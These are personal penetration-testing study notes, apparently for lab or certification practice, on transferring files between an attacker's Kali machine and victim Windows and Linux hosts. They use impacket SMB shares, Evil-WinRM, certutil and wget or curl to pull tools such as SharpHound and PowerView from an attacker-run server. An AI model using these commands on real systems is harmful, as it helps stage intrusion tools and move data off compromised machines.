---
description: >-
  This took lots of time for me to compile and understand. However, through
  applying the "try harder" mentality, this concept has made me gain more
  confidence in my competence.
cover: https://media3.giphy.com/media/xTiTnjZAjQipGn9JFS/200.gif
coverY: 0
---

# 📤 File Transfer

## Windows->Linux Methods

### SMB Server

On Kali:

```
impacket-smbserver smb .
```

On Windows:

```
net use \\kali-ip\smb

copy \\kali-ip\smb\SharpHound.exe .

dir

SharpHound.exe
```

* Be sure to open up the file through the file manager on Linux (GUI)
* This makes things easier

### Evil-WinRM

```
# Download to your Kali:
Evil-WinRM download /file/name/here

# Upload a file to the Windows victim from Kali
Evil-WinRM upload /file/name/here
```

## Linux->Windows

### Certutil

On Kali:

```
python3 -m http.server
```

On Windows:

```
certutil -urlcache -f http://<kali_ip_here:8000>/name_of_file name_of_file
```

### Evil-WinRM

```
Evil-WinRM: PS C:\programdata> upload /../../../PowerView.ps1
```

## Linux->Linux

### Wget

On Kali:

```
python3 -m http.server
```

On Victim:

```
wget http://<tun0_ip_here>:8000/<file_name_here> <file_name_here>
```

### Curl

On Kali:

```
python3 -m http.server
```

On Victim:

```
curl http://<tun0_ip_here:8000/<file_name_here> <file_name_here>
```

## References

{% embed url="https://0xdf.gitlab.io/2018/10/11/pwk-notes-post-exploitation-windows-file-transfers.html" %}

















